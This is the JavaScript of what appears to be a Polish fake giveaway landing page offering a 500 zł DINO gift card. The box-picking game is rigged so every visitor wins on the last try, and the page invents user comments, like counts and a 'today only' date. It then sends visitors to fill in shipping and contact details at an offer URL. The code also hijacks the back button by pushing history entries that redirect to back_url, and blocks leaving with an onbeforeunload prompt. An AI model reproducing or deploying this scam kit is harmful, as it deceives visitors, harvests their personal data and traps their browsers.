var array_day = new Array("Niedziela", "Poniedziałek", "Wtorek", "Środa", "Czwartek", "Piątek", "Sobota");
var array_month = new Array("Styczeń", "Luty", "Marsz", "Kwiecień", "Może", "Czerwiec", "Lipiec", "Sierpień", "Wrzesień", "Październik", "Listopad", "Grudzień");
var m_2_i = 's.png';
var m_2_d_2 = '(2) próbuje';
var m_2_d_1 = '(1) próbuje';
var m_2_d = 'Przepraszamy, Twoje pudełko jest puste. Nadal pozostały Ci <span id = "try"> </span>. Powodzenia!';
var m_2_b = 'OK';
$(document).ready(function () {
    $(document).prop('title', title);
    if (a != '') {
        $('#a .a').append('<img class="left" src="' + a + '" />');
    }
    if (a2 != '') {
        $('#a .a').append('<img class="right" src="' + a2 + '" />');
    }
    $('#a .a').append('<div class="z"></div>');
    if (b != '') {
        $('#b').html('<div class="a">' + b + '</div>');
    } else {
        $('#b').remove();
    }
    if (d != '') {
        $('#d').html(d);
    } else {
        $('#d').remove();
    }
    if (e != '') {
        $('#e').html(e);
    } else {
        $('#e').remove();
    }
    if (g != '') {
        $('#g').html(g);
    } else {
        $('#g').remove();
    }
    if (h != '') {
        $('#h').html(h);
    } else {
        $('#h').remove();
    }
    if (k != '') {
        $('#l').html(y(k, w));
    } else {
        $('#l').html(y(1945, w));
    }

    if (i != '') {
        var m = '';
        var foo = 0;
        $.each(i, function (idx, obj) {
            $.each(obj, function (idx, obj2) {
                foo++;
                n = '';
                oc = '';
                if (obj2.comment) {
                    $.each(obj2.comment, function (idx, com) {
                        oc = oc + "<p>" + com + "</p>";
                    });
                }
                if (obj2.likes > 0) {
                    n = y(obj2.likes, w) + ' <span class="m"></span>';
                } else {
                    n = '<span class="m_l"></span>';
                }
                m = m + '<div class="j"><div class="n"><img src="' + foo + '.png" /></div><div class="o"><div class="p">' + obj2.name + '</div><div class="q">' + oc + '</div><div class="r">' + l + ' · <span class="k"></span> ' + n + ' · <span class="s">' + obj2.time + '</span></div></div><div class="z"></div></div>';
            });
        });
        $('#k').html(m);
    } else {
        $('#k').remove();
    }
    if (j != '') {
        $('.m').each(function (i, obj) {
            $(this).html(j);
        });
    }
    if (m_l != '') {
        $('.m_l').html(m_l);
    } else {
        $('mm_l').remove();
    }

    // modal 1
    if (m_1_i != '') {
        $('#m_1_i').html('<img src="' + m_1_i + '" />');
    } else {
        $('#m_1_i').remove();
    }
    if (m_1_t != '') {
        $('#m_1_t').html(m_1_t);
    } else {
        $('#m_1_t').remove();
    }
    if (m_1_d != '') {
        var m = '';
        $.each(m_1_d, function (idx, obj) {
            $.each(obj, function (idx, obj2) {
                m = m + '<p>' + obj2 + '</p>';
            });
        });
        $('#m_1_d').html(m);
    } else {
        $('#m_1_d').remove();
    }
    if (m_1_b != '') {
        $('#m_1_b a').text(m_1_b);
    } else {
        $('#m_1_b').text('OK');
    }
    // modal 2
    if (m_2_i != '') {
        $('#m_2_i').html('<img src="' + m_2_i + '" />');
    } else {
        $('#m_2_i').remove();
    }
    if (m_2_d != '') {
        $('#m_2_d').html('<p>' + m_2_d + '</p>');
    } else {
        $('#m_2_d').remove();
    }
    if (m_2_b != '') {
        $('#m_2_b a').text(m_2_b);
    } else {
        $('#m_2_b a').text('OK');
    }
    // modal 3
    if (m_3_t != '') {
        $('#m_3_t').html(m_3_t);
    } else {
        $('#m_3_t').remove();
    }
    if (m_3_s != '') {
        $('#m_3_s').html(m_3_s);
    } else {
        $('#m_3_s').remove();
    }
    if (m_3_i != '') {
        $('#m_3_i').html('<img src="' + m_3_i + '" />');
    } else {
        $('#m_3_i').remove();
    }
    if (m_3_d != '') {
        var m = '';
        $.each(m_3_d, function (idx, obj) {
            $.each(obj, function (idx, obj2) {
                m = m + '<p>' + obj2 + '</p>';
            });
        });
        $('#m_3_d').html(m);
    } else {
        $('#m_3_d').remove();
    }
    if (m_3_b != '') {
        $('#m_3_b a').text(m_3_b);
    } else {
        $('#m_3_b a').text('OK');
    }

    if (win != '') {
        $('.w').each(function (i, obj) {
            $(this).html(win);
        });
    }
    if (win_brand != '') {
        $('.w_b').each(function (i, obj) {
            $(this).html(win_brand);
        });
    }

    // load boxes
    for (i = 0; i < 12; i++) {
        $('#i').append('<div class="e" id="b_' + i + '"><div class="f"><div class="g"><a href="#" onclick="cl(\'b_' + i + '\');return false;"><img src="a.png" /></a></div></div></div>');
    }
    $('#i').append('<div class="z"></div>');

    //load modal 1
    $('#m').fadeIn("slow", function () {
        $('#m_1').fadeIn("200", function () { });
        $('#m_1 .t_a').removeClass('small');
    });

    // dates
    var mydate = new Date();
    mydate.setDate(mydate.getDate() - 0);

    var year = mydate.getYear();
    if (year < 1000) {
        year += 1900;
    }

    var day = mydate.getDay();
    var month = mydate.getMonth();

    var daym = mydate.getDate();
    if (daym < 10) {
        daym = "0" + daym;
    }

    $('.date_day_number').each(function (i, obj) {
        $(this).html(daym);
    });
    $('.date_month').each(function (i, obj) {
        $(this).html(array_month[month]);
    });
    $('.date_day_week').each(function (i, obj) {
        $(this).html(array_day[day]);
    });

});
// ON PAGE LOAD

// ON CLICK
function cl(x) {
    if (try_num > 2) {
        $('#try').html(m_2_d_2);
    } else {
        $('#try').html(m_2_d_1);
    }
    if (try_num > 1) {
        try_num = try_num - 1;
        $('#' + x).html('<div class="f"><div class="h"><div></div></div></div>');
        $('#m').fadeIn("slow", function () {
            $('#m_2').fadeIn("200", function () { });
            $('#m_2 .t_a').removeClass('small');
        });
    } else {
        // win
        $('#' + x).html('<div class="f"><div class="i"><div></div><div></div><div></div></div></div>');
        if (win_box != '') {
            $('#' + x + ' .i div:nth-child(1)').css("background", "url('" + win_box + "')");
        }
        if (win_box != '') {
            $('#' + x + ' .i div:nth-child(1)').css("background-size", "contain");
        }
        $('#m').fadeIn("slow", function () {
            $('#m_3').fadeIn("200", function () { });
            $('#m_3 .t_a').removeClass('small');
        });
    }
}
// ON CLICK

// FAVICON
window.onload = function () {
    z(1);
};


// COMMA
function y(x, y) {
    return x.toString().replace(/\B(?=(\d{3})+(?!\d))/g, y);
}
// COMMA

// FAVICON
function z(y) {
    if (!y) {
        y = 1;
    }
    var z1 = document.createElement('canvas');
    z1.width = 16;
    z1.height = 16;
    var x = z1.getContext('2d');
    x.beginPath();
    x.rect(0, 2, 14, 14);
    x.fillStyle = o;
    x.fill();
    x.beginPath();
    x.arc(16 - 6, 6, 6, 0, 2 * Math.PI);
    x.fillStyle = '#ff0000';
    x.fill();
    x.strokeStyle = '#ffffff';
    x.stroke();
    x.font = 'bold 10px "arial", sans-serif';
    x.textAlign = "center";
    x.textBaseline = "middle";
    x.fillStyle = '#ffffff';
    x.fillText(y, 10, 6);
    favicon.href = z1.toDataURL('image/png');
}
// FAVICON

// GO
function go() {
    window.onbeforeunload = null;
    window.open(offer_url);
    document.location.assign(split_url);
}

// BACK
var t;
try {
    for (t = 0; 10 > t; ++t) history.pushState({}, "", "");
    onpopstate = function (t) {
        // window.onbeforeunload = null;
        t.state && location.replace(back_url);
    }
} catch (o) { }


// UNLOAD
var pz = 1;
window.onunload = window.onbeforeunload = function (evt) {
    var message = "Back to the page?";
    if (pz == 1) {
        if (typeof evt == "undefined") evt = window.event;
        if (evt) evt.returnValue = message;
        return message;
    }
};

var win = '500zl karta podarunkowa DINO';
var win_brand = '';
var win_box = 'ixs_box.png';
var title = 'Znajdź 500zl karta podarunkowa DINO';
var o = '#00a0d6';
var a = "o.png";
var a2 = "m_w.png";
var b = "DINO konkurs, tylko dziś: <span class='date_day_number'></span> <span class='date_month'></span>";
var d = "Drogi Użytkowniku,";
var e = "każdy <span class = 'date_day_week'> </span> wybieramy 6 szczęśliwców, którzy otrzymują szansę wygrania <span class = 'w'> </span>.";
var g = "Aby wygrać, wybierz właściwe pudełko z prezentem.";
var h = "Odnaleźć <span class='w'></span>";

var j = "osób lubi to";
var k = 4281;
var m_l = "Lubię to!"; // Like for comments
var l = "";
var w = "";

// modal 1
var m_1_i = 'ixs.png';
var m_1_t = 'Konkurs DINO';
var m_1_d = [{
    "1": "Gratulacje, klient DINO!",
    "2": "In the competition sponsored by DINO you can win a  <strong> <span class = 'w'> </span></strong>.",
    "3": "Wystarczy wybrać właściwe pudełko z prezentem.",
    "4": "<strong> Masz 3 próby. Powodzenia! </strong>",
}];
var m_1_b = 'OK';


var m_3_i = 'ixs.png';
var m_3_t = 'Gratulacje!';
var m_3_s = '(1) <span class = "w_b"> </span> <span class = "w"> </span> Zarezerwowano ';
var m_3_d = [{
    "1": "1. Kliknij przycisk poniżej.",
    "2": "2. Dokładnie wypełnij następną stronę informacji o wysyłce i dane kontaktowe.",
    "3": "3. Twój <strong> <span class = 'w'> </span></strong> zostanie wysłany w ciągu 2 dni roboczych."
}];
var m_3_b = 'Odbierz prezent';

var i = [{
    "1": {
        "name": "Katarzyna Janson",
        "likes": "",
        "time": "4 Minuty",
        "comment": {
            "1": "Dziś dostałam swojego <span class = 'w_b'> </span> <span class = 'w'> </span> Strasznie się cieszę!",
        }
    },
    "2": {
        "name": "Jarek Piotrowski",
        "likes": "",
        "time": "5 Minuty",
        "comment": {
            "1": "Kurczę, coś mi nie poszło... Mogę jeszcze raz?",
        }
    },
    "3": {
        "name": "Joanna Tomala",
        "likes": "",
        "time": "11 Minuty",
        "comment": {
            "1": "Dziś odebrałam, dzięki!",
        }
    },
    "4": {
        "name": "Filip Orłowski",
        "likes": "",
        "time": "15 Minuty",
        "comment": {
            "1": "Wygrałem! <span class='w_b'></span> <span class='w'></span>! Łuuuuuuuu",
        }
    },
    "5": {
        "name": "Patrycja Engel",
        "likes": "",
        "time": "38 Minuty",
        "comment": {
            "1": "Super sprawa, nie mogę się doczekać telefonu!",
        }
    },
    "6": {
        "name": "Wioletta Andrzejczak",
        "likes": "",
        "time": "42 Minuty",
        "comment": {
            "1": ":(:( Naprawdę go chciałam! To nie fair!",
        }
    }
}];